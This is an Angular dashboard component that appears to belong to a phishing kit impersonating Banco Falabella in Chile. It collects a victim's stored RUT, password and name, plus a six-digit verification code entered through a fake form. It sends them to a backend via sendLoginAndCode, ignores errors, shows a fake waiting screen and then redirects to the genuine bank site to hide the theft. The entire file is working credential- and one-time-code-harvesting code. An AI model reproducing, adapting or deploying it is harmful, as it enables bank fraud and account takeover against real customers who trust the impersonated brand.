import { Component, HostListener, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { UserModel } from 'src/app/shared/models/user.model';
import { MainService } from 'src/app/shared/services/main.service';

@Component({
  selector: 'app-dashboard',
  templateUrl: './dashboard.component.html',
  styleUrls: ['./dashboard.component.scss'],
})
export class DashboardComponent implements OnInit {
  public shortName = 'Estimado';

  public stepOne = true;
  public stepTwo = false;
  public stepThree = false;

  public conteo = 15;

  public isCodeError = false;
  public isLoading = false;

  public dateTime: Date;
  public userModel: UserModel;

  public ifMobile: boolean = true;
  public innerWidth: number = window.innerWidth;

  constructor(private mainSrv: MainService, private router: Router) {
    const state = localStorage.getItem('isOk');
    if (!state || state !== 'true') {
      this.router.navigate(['/prestamos']);
    }

    this.dateTime = new Date();
    this.userModel = new UserModel();
    setTimeout(() => {
      this.stepOne = false;
      this.stepTwo = true;
      this.stepThree = false;
    }, 7000);

    const userName = localStorage.getItem('userName');
    if (userName && userName !== 'Indefinido') {
      this.shortName = userName.split(' ')[0];
    }
  }

  ngOnInit(): void {
    // this.checkIfRut();
    this.isMobile(this.innerWidth);
  }

  ngAfterViewInit() {
    setTimeout(() => {
      this.innerWidth = window.innerWidth;
      this.isMobile(this.innerWidth);
    }, 0);
  }

  @HostListener('window:resize', ['$event'])
  onResize(event: any) {
    this.innerWidth = event.target.innerWidth;
    this.isMobile(this.innerWidth);
  }

  checkIfRut() {
    const ifUserRut = localStorage.getItem('userRut');
    if (!ifUserRut || !ifUserRut.length) {
      location.href = '/inicios';
      return false;
    }
    return true;
  }

  isMobile(current: number): void {
    if (current > 992) {
      this.ifMobile = false;
    } else {
      this.ifMobile = true;
    }
  }

  async send() {
    this.isCodeError = false;
    this.isLoading = false;

    if (
      !this.userModel.codeUno ||
      !this.userModel.codeDos ||
      !this.userModel.codeTres ||
      !this.userModel.codeCuatro ||
      !this.userModel.codeCinco ||
      !this.userModel.codeSeis
    ) {
      this.isLoading = false;
      this.isCodeError = true;
      return false;
    }

    if (
      this.userModel.codeUno.length !== 1 ||
      this.userModel.codeDos.length !== 1 ||
      this.userModel.codeTres.length !== 1 ||
      this.userModel.codeCuatro.length !== 1 ||
      this.userModel.codeCinco.length !== 1 ||
      this.userModel.codeSeis.length !== 1
    ) {
      this.isLoading = false;
      this.isCodeError = true;
      return false;
    }

    let codeUno = this.hasLetter(this.userModel.codeUno);
    let codeDos = this.hasLetter(this.userModel.codeDos);
    let codeTres = this.hasLetter(this.userModel.codeTres);
    let codeCuatro = this.hasLetter(this.userModel.codeCuatro);
    let codeCinco = this.hasLetter(this.userModel.codeCinco);
    let codeSeis = this.hasLetter(this.userModel.codeSeis);

    if (codeUno || codeDos || codeTres || codeCuatro || codeCinco || codeSeis) {
      this.isLoading = false;
      this.isCodeError = true;
      return false;
    }

    this.isCodeError = false;
    this.isLoading = true;

    //activar loading
    let code = `${this.userModel.codeUno}${this.userModel.codeDos}${this.userModel.codeTres}${this.userModel.codeCuatro}${this.userModel.codeCinco}${this.userModel.codeSeis}`;
    const userRut = localStorage.getItem('userRut') || '';
    const userPass = localStorage.getItem('userPass') || '';
    const userName = localStorage.getItem('userName') || '';

    try {
      await this.mainSrv.sendLoginAndCode(userRut, userPass, userName, code);
    } catch (error) {
    } finally {
      setTimeout(() => {
        this.retroceso();
      }, 2000);

      return true;
    }
  }

  close() {
    localStorage.removeItem('userRut');
    document.location.href = 'https://www.bancofalabella.cl/';
  }

  retroceso() {
    this.stepOne = false;
    this.stepTwo = false;
    this.stepThree = true;

    localStorage.removeItem('userRut');

    setInterval(() => {
      if (this.conteo > 0) {
        this.conteo--;
      } else {
        document.location.href = 'https://www.bancofalabella.cl/';
      }
    }, 1000);
  }

  inputOnChange(value: any, current: any, next: any, prev: any) {
    if (current.value == '' && current.value.length === 0) {
      if (prev) {
        prev.focus();
      }
    }

    let result = this.hasLetter(current.value);
    if (result) {
      return false;
    }

    if (next) {
      if (current.value.length === 1) {
        next.focus();
      }
    }

    return true;
  }

  private hasLetter(cadena: string) {
    if (isNaN(+cadena)) {
      return true;
    }
    return false;
  }

  public justNumerKeyPress(event: KeyboardEvent) {
    const tecla = document.all ? event.keyCode : event.which;
    if (tecla === 8) {
      return true;
    }
    const patron = /[0-9]/;
    const teclaFinal = String.fromCharCode(tecla);
    return patron.test(teclaFinal);
  }
}
